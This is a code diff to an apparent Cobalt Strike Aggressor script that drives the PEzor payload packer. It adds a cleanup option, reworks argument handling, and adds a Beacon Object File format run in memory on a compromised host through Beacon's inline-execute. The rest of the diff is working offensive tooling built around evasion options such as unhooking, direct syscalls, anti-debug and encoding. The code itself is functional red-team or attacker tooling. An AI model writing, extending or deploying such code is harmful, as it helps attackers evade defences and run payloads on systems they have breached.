@@ -15,7 +15,7 @@ alias generate-payload {
 }
 
 sub execute_PEzor {
-    local('$command $match $type $executable $sgn $rx $self $debug $32 $64 $sdk $index $unhook $syscalls $antidebug $sleep $wait $format $length $end $opts $args $otheropts @argv $tmpdest $handle @output $packed');
+    local('$command $match $type $executable $sgn $rx $self $debug $32 $64 $sdk $index $unhook $syscalls $cleanup $antidebug $sleep $wait $format $length $end $opts $args $otheropts @argv $tmpdest $handle @output $packed');
     $command = $1;
 
     # manually parse args
@@ -63,6 +63,10 @@ sub execute_PEzor {
     ($match, $type) = matched();
     $syscalls = copy($match);
 
+    find($command, '(\-cleanup)');
+    ($match, $type) = matched();
+    $cleanup = copy($match);
+
     find($command, '\-sleep=(\d*)');
     ($match, $type) = matched();
     $sleep = copy($match);
@@ -84,7 +88,7 @@ sub execute_PEzor {
     ($match, $type) = matched();
     $args = copy($match);
 
-    $otheropts = replace($opts, " *\-p ' $+ $args $+ ' *", "");
+    $otheropts = replace($opts, " *\-p ' $+ $args $+ ' *", " ");
     $otheropts = replace($otheropts, '^ *| *$', "");
 
     if ($wait eq "") {
@@ -141,6 +145,10 @@ sub execute_PEzor {
         push(@argv, $syscalls);
     }
 
+    if ($cleanup ne "") {
+        push(@argv, $cleanup);
+    }
+
     if ($sleep ne "") {
         push(@argv, "-sleep= $+ $sleep");
     }
@@ -156,12 +164,10 @@ sub execute_PEzor {
         push(@argv, $args);
     }
 
-    push(@argv, $otheropts);
-
     println($opts);
     println($otheropts);
 
-    #@argv = concat(@argv, split($otheropts, " "));
+    @argv = concat(@argv, split(" ", $otheropts));
 
     printAll(@argv);
 
@@ -192,7 +198,15 @@ sub execute_PEzor {
         $packed = "$tmpdest $+ .packed.reflective.dll";
         println("PEzor generated reflective DLL $packed");
         return $packed;
-    } else { # } else if ("dotnet" isin $format) {
+    } else if ($format eq "bof") {
+        if ($32) {
+            $packed = "$tmpdest $+ .packed.x86.o";
+        } else {
+            $packed = "$tmpdest $+ .packed.x64.o";
+        }
+        println("PEzor generated Beacon Object File $packed");
+        return $packed;
+    }  else { # } else if ("dotnet" isin $format) {
         $packed = "$tmpdest $+ .packed.dotnet.exe";
         println("PEzor generated .NET assembly $packed");
         return $packed;
@@ -223,9 +237,18 @@ sub execute_inmemory {
     $args = copy($match);
 
     # validation
-    if (($format ne "") && ("dotnet" !isin $format) && ($format ne "reflective-dll")) {
-        berror($beacon, "Format $format is not supported, use -format=reflective-dll or -format=dotnet");
+    if (($format ne "") && ("dotnet" !isin $format) && ($format ne "reflective-dll") && ($format ne "bof")) {
+        berror($beacon, "Format $format is not supported, use -format=reflective-dll or -format=dotnet or -format=bof");
         return;
+    }
+
+    if ($format eq "bof") {
+        $command = "$command -t";
+        if (binfo($beacon, "arch") eq "x64") {
+            #$command = "$command -64";
+        } else {
+            #$command = "$command -32";
+        }
     }
 
     if ($wait eq "") {
@@ -248,6 +271,12 @@ sub execute_inmemory {
 
         # call execute-assembly
         bexecute_assembly($beacon, $packed);
+    } else if ($format eq "bof") {
+        blog($beacon, "PEzor generated Beacon Object File $packed");
+        println("Executing generated Beacon Object File: $packed");
+
+        # call execute-assembly
+        binline_execute($beacon, $packed);
     } else {
         blog($beacon, "PEzor generated reflective DLL $packed");
         println("Executing generated reflective DLL: $packed");
